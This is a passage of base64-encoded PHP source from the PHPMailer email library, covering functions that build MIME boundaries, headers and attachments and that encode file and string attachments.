rKCRmaWxlKTsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NpZ25pbmcnKSAuIG9wZW5zc2xfZXJyb3Jfc3RyaW5nKCkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRib2R5OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBzdGFydCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNoYXJTZXQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNvbnRlbnRUeXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEJvdW5kYXJ5KCRib3VuZGFyeSwgJGNoYXJTZXQsICRjb250ZW50VHlwZSwgJGVuY29kaW5nKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKICAgICAgICBpZiAoJGNoYXJTZXQgPT0gJycpIHsKICAgICAgICAgICAgJGNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICB9CiAgICAgICAgaWYgKCRjb250ZW50VHlwZSA9PSAnJykgewogICAgICAgICAgICAkY29udGVudFR5cGUgPSAkdGhpcy0+Q29udGVudFR5cGU7CiAgICAgICAgfQogICAgICAgIGlmICgkZW5jb2RpbmcgPT0gJycpIHsKICAgICAgICAgICAgJGVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJGJvdW5kYXJ5KTsKICAgICAgICAkcmVzdWx0IC49IHNwcmludGYoJ0NvbnRlbnQtVHlwZTogJXM7IGNoYXJzZXQ9JXMnLCAkY29udGVudFR5cGUsICRjaGFyU2V0KTsKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsKICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgaWYgKCRlbmNvZGluZyAhPSAnN2JpdCcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICRlbmNvZGluZyk7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOwoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiB0aGUgZW5kIG9mIGEgbWVzc2FnZSBib3VuZGFyeS4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZEJvdW5kYXJ5KCRib3VuZGFyeSkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPkxFIC4gJy0tJyAuICRib3VuZGFyeSAuICctLScgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIG1lc3NhZ2UgdHlwZS4KICAgICAqIFBIUE1haWxlciBvbmx5IHN1cHBvcnRzIHNvbWUgcHJlc2V0IG1lc3NhZ2UgdHlwZXMsIG5vdCBhcmJpdHJhcnkgTUlNRSBzdHJ1Y3R1cmVzLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0TWVzc2FnZVR5cGUoKQogICAgewogICAgICAgICR0eXBlID0gYXJyYXkoKTsKICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdhbHQnOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmlubGluZUltYWdlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdpbmxpbmUnOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmF0dGFjaG1lbnRFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2F0dGFjaCc7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSBpbXBsb2RlKCdfJywgJHR5cGUpOwogICAgICAgIGlmICgkdGhpcy0+bWVzc2FnZV90eXBlID09ICcnKSB7CiAgICAgICAgICAgIC8vVGhlICdwbGFpbicgbWVzc2FnZV90eXBlIHJlZmVycyB0byB0aGUgbWVzc2FnZSBoYXZpbmcgYSBzaW5nbGUgYm9keSBlbGVtZW50LCBub3QgdGhhdCBpdCBpcyBwbGFpbi10ZXh0CiAgICAgICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSAncGxhaW4nOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhIGhlYWRlciBsaW5lLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaGVhZGVyTGluZSgkbmFtZSwgJHZhbHVlKQogICAgewogICAgICAgIHJldHVybiAkbmFtZSAuICc6ICcgLiAkdmFsdWUgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gYSBmb3JtYXR0ZWQgbWFpbCBsaW5lLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdGV4dExpbmUoJHZhbHVlKQogICAgewogICAgICAgIHJldHVybiAkdmFsdWUgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gYXR0YWNobWVudCBmcm9tIGEgcGF0aCBvbiB0aGUgZmlsZXN5c3RlbS4KICAgICAqIE5ldmVyIHVzZSBhIHVzZXItc3VwcGxpZWQgcGF0aCB0byBhIGZpbGUhCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBmaWxlIGNvdWxkIG5vdCBiZSBmb3VuZCBvciByZWFkLgogICAgICogRXhwbGljaXRseSAqZG9lcyBub3QqIHN1cHBvcnQgcGFzc2luZyBVUkxzOyBQSFBNYWlsZXIgaXMgbm90IGFuIEhUVFAgY2xpZW50LgogICAgICogSWYgeW91IG5lZWQgdG8gZG8gdGhhdCwgZmV0Y2ggdGhlIHJlc291cmNlIHlvdXJzZWxmIGFuZCBwYXNzIGl0IGluIHZpYSBhIGxvY2FsIGZpbGUgb3Igc3RyaW5nLgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBQYXRoIHRvIHRoZSBhdHRhY2htZW50LgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQXR0YWNobWVudCgkcGF0aCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JykKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkcGF0aCkgb3IgIUBpc19maWxlKCRwYXRoKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsKICAgICAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7CiAgICAgICAgICAgIGlmICgkbmFtZSA9PSAnJykgewogICAgICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgICAgIDAgPT4gJHBhdGgsCiAgICAgICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgICAgICA1ID0+IGZhbHNlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgNyA9PiAwCiAgICAgICAgICAgICk7CgogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBhcnJheSBvZiBhdHRhY2htZW50cy4KICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEF0dGFjaG1lbnRzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmF0dGFjaG1lbnQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBBdHRhY2ggYWxsIGZpbGUsIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cyB0byB0aGUgbWVzc2FnZS4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb25fdHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhdHRhY2hBbGwoJGRpc3Bvc2l0aW9uX3R5cGUsICRib3VuZGFyeSkKICAgIHsKICAgICAgICAvLyBSZXR1cm4gdGV4dCBvZiBib2R5CiAgICAgICAgJG1pbWUgPSBhcnJheSgpOwogICAgICAgICRjaWRVbmlxID0gYXJyYXkoKTsKICAgICAgICAkaW5jbCA9IGFycmF5KCk7CgogICAgICAgIC8vIEFkZCBhbGwgYXR0YWNobWVudHMKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICAvLyBDaGVjayBpZiBpdCBpcyBhIHZhbGlkIGRpc3Bvc2l0aW9uX2ZpbHRlcgogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJGRpc3Bvc2l0aW9uX3R5cGUpIHsKICAgICAgICAgICAgICAgIC8vIENoZWNrIGZvciBzdHJpbmcgYXR0YWNobWVudAogICAgICAgICAgICAgICAgJHN0cmluZyA9ICcnOwogICAgICAgICAgICAgICAgJHBhdGggPSAnJzsKICAgICAgICAgICAgICAgICRiU3RyaW5nID0gJGF0dGFjaG1lbnRbNV07CiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkc3RyaW5nID0gJGF0dGFjaG1lbnRbMF07CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwYXRoID0gJGF0dGFjaG1lbnRbMF07CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGluY2xoYXNoID0gbWQ1KHNlcmlhbGl6ZSgkYXR0YWNobWVudCkpOwogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRpbmNsaGFzaCwgJGluY2wpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkaW5jbFtdID0gJGluY2xoYXNoOwogICAgICAgICAgICAgICAgJG5hbWUgPSAkYXR0YWNobWVudFsyXTsKICAgICAgICAgICAgICAgICRlbmNvZGluZyA9ICRhdHRhY2htZW50WzNdOwogICAgICAgICAgICAgICAgJHR5cGUgPSAkYXR0YWNobWVudFs0XTsKICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiA9ICRhdHRhY2htZW50WzZdOwogICAgICAgICAgICAgICAgJGNpZCA9ICRhdHRhY2htZW50WzddOwogICAgICAgICAgICAgICAgaWYgKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJyAmJiBhcnJheV9rZXlfZXhpc3RzKCRjaWQsICRjaWRVbmlxKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGNpZFVuaXFbJGNpZF0gPSB0cnVlOwoKICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzJXMnLCAkYm91bmRhcnksICR0aGlzLT5MRSk7CiAgICAgICAgICAgICAgICAvL09ubHkgaW5jbHVkZSBhIGZpbGVuYW1lIHByb3BlcnR5IGlmIHdlIGhhdmUgb25lCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRuYW1lKSkgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlczsgbmFtZT0iJXMiJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSksCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgICAgICAgICBpZiAoJGVuY29kaW5nICE9ICc3Yml0JykgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlcyVzJywgJGVuY29kaW5nLCAkdGhpcy0+TEUpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1JRDogPCVzPiVzJywgJGNpZCwgJHRoaXMtPkxFKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAvLyBJZiBhIGZpbGVuYW1lIGNvbnRhaW5zIGFueSBvZiB0aGVzZSBjaGFycywgaXQgc2hvdWxkIGJlIHF1b3RlZCwKICAgICAgICAgICAgICAgIC8vIGJ1dCBub3Qgb3RoZXJ3aXNlOiBSRkMyMTgzICYgUkZDMjA0NSA1LjEKICAgICAgICAgICAgICAgIC8vIEZpeGVzIGEgd2FybmluZyBpbiBJRVRGJ3MgbXNnbGludCBNSU1FIGNoZWNrZXIKICAgICAgICAgICAgICAgIC8vIEFsbG93IGZvciBieXBhc3NpbmcgdGhlIENvbnRlbnQtRGlzcG9zaXRpb24gaGVhZGVyIHRvdGFsbHkKICAgICAgICAgICAgICAgIGlmICghKGVtcHR5KCRkaXNwb3NpdGlvbikpKSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpOwogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvWyBcKFwpPD5ALDs6XFwiXC9cW1xdXD89XS8nLCAkZW5jb2RlZF9uYW1lKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9IiVzIiVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUgLiAkdGhpcy0+TEUKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRlbmNvZGVkX25hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPSVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRSAuICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkxFIC4gJHRoaXMtPkxFCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIC8vIEVuY29kZSBhcyBzdHJpbmcgYXR0YWNobWVudAogICAgICAgICAgICAgICAgaWYgKCRiU3RyaW5nKSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHN0cmluZywgJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+ZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzLS0lcycsICRib3VuZGFyeSwgJHRoaXMtPkxFKTsKCiAgICAgICAgcmV0dXJuIGltcGxvZGUoJycsICRtaW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIGZpbGUgYXR0YWNobWVudCBpbiByZXF1ZXN0ZWQgZm9ybWF0LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggVGhlIGZ1bGwgcGF0aCB0byB0aGUgZmlsZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgVGhlIGVuY29kaW5nIHRvIHVzZTsgb25lIG9mICdiYXNlNjQnLCAnN2JpdCcsICc4Yml0JywgJ2JpbmFyeScsICdxdW90ZWQtcHJpbnRhYmxlJwogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nID0gJ2Jhc2U2NCcpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCFzZWxmOjppc1Blcm1pdHRlZFBhdGgoJHBhdGgpIG9yICFmaWxlX2V4aXN0cygkcGF0aCkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfb3BlbicpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRtYWdpY19xdW90ZXMgPSBmYWxzZTsKICAgICAgICAgICAgaWYoIHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzcuNC4wJywgJzwnKSApIHsKICAgICAgICAgICAgICAgICRtYWdpY19xdW90ZXMgPSBnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJG1hZ2ljX3F1b3RlcykgewogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMy4wJywgJzwnKSkgewogICAgICAgICAgICAgICAgICAgIHNldF9tYWdpY19xdW90ZXNfcnVudGltZShmYWxzZSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIC8vRG9lc24ndCBleGlzdCBpbiBQSFAgNS40LCBidXQgd2UgZG9uJ3QgbmVlZCB0byBjaGVjayBiZWNhdXNlCiAgICAgICAgICAgICAgICAgICAgLy9nZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUgYWx3YXlzIHJldHVybnMgZmFsc2UgaW4gNS40KwogICAgICAgICAgICAgICAgICAgIC8vc28gaXQgd2lsbCBuZXZlciBnZXQgaGVyZQogICAgICAgICAgICAgICAgICAgIGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgZmFsc2UpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsKICAgICAgICAgICAgJGZpbGVfYnVmZmVyID0gJHRoaXMtPmVuY29kZVN0cmluZygkZmlsZV9idWZmZXIsICRlbmNvZGluZyk7CiAgICAgICAgICAgIGlmICgkbWFnaWNfcXVvdGVzKSB7CiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7CiAgICAgICAgICAgICAgICAgICAgc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCRtYWdpY19xdW90ZXMpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpbmlfc2V0KCdtYWdpY19xdW90ZXNfcnVudGltZScsICRtYWdpY19xdW90ZXMpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkZmlsZV9idWZmZXI7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBzdHJpbmcgaW4gcmVxdWVzdGVkIGZvcm1hdC4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgVGhlIHRleHQgdG8gZW5jb2RlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBUaGUgZW5jb2RpbmcgdG8gdXNlOyBvbmUgb2YgJ2Jhc2U2NCcsICc3Yml0JywgJzhiaXQnLCAnYmluYXJ5JywgJ3F1b3RlZC1wcmludGFibGUnCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVN0cmluZygkc3RyLCAkZW5jb2RpbmcgPSAnYmFzZTY0JykKICAgIHsKICAgICAgICAkZW5jb2RlZCA9ICcnOwogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkZW5jb2RpbmcpKSB7CiAgICAgICAgICAgIGNhc2UgJ2Jhc2U2NCc6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGNodW5rX3NwbGl0KGJhc2U2NF9lbmNvZGUoJHN0ciksIDc2LCAkdGhpcy0+TEUpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJzdiaXQnOgogICAgICAgICAgICBjYXNlICc4Yml0JzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmZpeEVPTCgkc3RyKTsKICAgICAgICAgICAgICAgIC8vIE1ha2Ugc3VyZSBpdCBlbmRzIHdpdGggYSBsaW5lIGJyZWFrCiAgICAgICAgICAgICAgICBpZiAoc3Vic3RyKCRlbmNvZGVkLCAtKHN0cmxlbigkdGhpcy0+TEUpKSkgIT0gJHRoaXMtPkxFKSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2JpbmFyeSc6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICRzdHI7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAncXVvdGVkLXByaW50YWJsZSc6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5lbmNvZGVRUCgkc3RyKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBk